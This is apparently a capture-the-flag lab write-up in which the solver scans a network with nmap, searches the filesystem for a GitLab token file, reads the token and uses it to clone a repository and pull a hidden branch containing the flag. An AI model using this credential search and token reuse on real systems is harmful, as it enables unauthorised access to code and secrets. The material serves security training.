#### 3. Compromised Developer Machine II

----

- You have access to a developer machine on the network. A secret flag is hidden in the Gitlab repo used for app development.
- Objective: Find the flag in the source code repo!

----

```sh
root@attackdefense:/# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1387: eth0@if1388: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.4/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
1390: eth1@if1391: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:5a:7f:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.90.127.2/24 brd 192.90.127.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:/#
```

```sh
root@attackdefense:/# cd
root@attackdefense:~#
root@attackdefense:~# ls -l
total 4
drwxr-xr-x 1 root root 4096 May 16 18:20 projects
root@attackdefense:~#
```

```sh
root@attackdefense:~# tree
.
`-- projects
    `-- root
        `-- my-project
            |-- README
            |-- functions.php
            |-- index.php
            |-- js
            |   |-- sorttable.js
            |   `-- xoda.js
            |-- mobile.css
            `-- style.css

4 directories, 7 files
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap -sn 192.90.127.2/24

Starting Nmap 7.60 ( https://nmap.org ) at 2019-07-29 02:59 UTC
Nmap scan report for 192.90.127.1
Host is up (0.000053s latency).
MAC Address: 02:42:2D:F1:30:EC (Unknown)
Nmap scan report for gitlab (192.90.127.3)
Host is up (0.000016s latency).
MAC Address: 02:42:C0:5A:7F:03 (Unknown)
Nmap scan report for attackdefense.com (192.90.127.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 16.83 seconds
root@attackdefense:~#
```

```sh
root@attackdefense:~# nmap 192.90.127.3

Starting Nmap 7.60 ( https://nmap.org ) at 2019-07-29 03:00 UTC
Nmap scan report for gitlab (192.90.127.3)
Host is up (0.000015s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:C0:5A:7F:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.63 seconds
root@attackdefense:~#
```

Developers use SSH keys or tokens to make pull/push activity easier. If we look for SSH keys,
we won’t find any. Hence, search for token file on the system.

```sh
root@attackdefense:~# find / -name *token* 2>/dev/null
/etc/gitlab/token
/usr/lib/python3.6/token.py
/usr/lib/python3.6/tokenize.py
root@attackdefense:~#
```

```sh
root@attackdefense:~# cat /etc/gitlab/token
3Xw-3TjVCvyuoJHex58y
root@attackdefense:~#
```

```sh
root@attackdefense:~# cd projects/root/
root@attackdefense:~/projects/root# tree
.
`-- my-project
    |-- README
    |-- functions.php
    |-- index.php
    |-- js
    |   |-- sorttable.js
    |   `-- xoda.js
    |-- mobile.css
    `-- style.css

2 directories, 7 files
root@attackdefense:~/projects/root# rm -rf my-project/
```

```sh
root@attackdefense:~/projects/root# git clone http://192.90.127.3/root/my-project.git
Cloning into 'my-project'...
Username for 'http://192.90.127.3': root
Password for 'http://root@192.90.127.3':
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 2), reused 0 (delta 0)
Unpacking objects: 100% (17/17), done.
root@attackdefense:~/projects/root#
```

```sh
root@attackdefense:~/projects/root# cd my-project/
root@attackdefense:~/projects/root/my-project# git log
commit d013f4483687e7302baf0ba8d80f1dd6bad21d06 (HEAD -> master, origin/master, origin/HEAD)
Author: Administrator <admin@example.com>
Date:   Thu May 16 18:15:59 2019 +0000

    code commit

commit 8c4feb0d8a4a6d56c5b004addfdba451be1b5eeb
Author: Administrator <admin@example.com>
Date:   Thu May 16 18:11:04 2019 +0000

    Initial commit
root@attackdefense:~/projects/root/my-project#
```

```sh
root@attackdefense:~/projects/root/my-project# git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/beta
  remotes/origin/master
root@attackdefense:~/projects/root/my-project# git checkout -b beta
Switched to a new branch 'beta'
root@attackdefense:~/projects/root/my-project# git branch -a
* beta
  master
  remotes/origin/HEAD -> origin/master
  remotes/origin/beta
  remotes/origin/master
root@attackdefense:~/projects/root/my-project# 
```

```sh
root@attackdefense:~/projects/root/my-project# git pull origin beta
Username for 'http://192.90.127.3': root
Password for 'http://root@192.90.127.3':
From http://192.90.127.3/root/my-project
 * branch            beta       -> FETCH_HEAD
Updating d013f44..c5bb45d
Fast-forward
 flag.txt | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 flag.txt
root@attackdefense:~/projects/root/my-project# ls -l
total 160
-rw-r--r-- 1 root root  8703 Jul 29 03:06 README
-rw-r--r-- 1 root root    14 Jul 29 03:06 README.md
-rw-r--r-- 1 root root    32 Jul 29 03:09 flag.txt
-rw-r--r-- 1 root root 40563 Jul 29 03:06 functions.php
-rw-r--r-- 1 root root 57739 Jul 29 03:06 index.php
drwxr-xr-x 2 root root  4096 Jul 29 03:06 js
-rw-r--r-- 1 root root  5265 Jul 29 03:06 mobile.css
-rw-r--r-- 1 root root  5758 Jul 29 03:06 style.css
-rw-r--r-- 1 root root 18850 Jul 29 03:06 zipstream.php
root@attackdefense:~/projects/root/my-project# cat flag.txt
25b13816154f9fb51b7cc508bdf419d1
root@attackdefense:~/projects/root/my-project#
```

----

EOF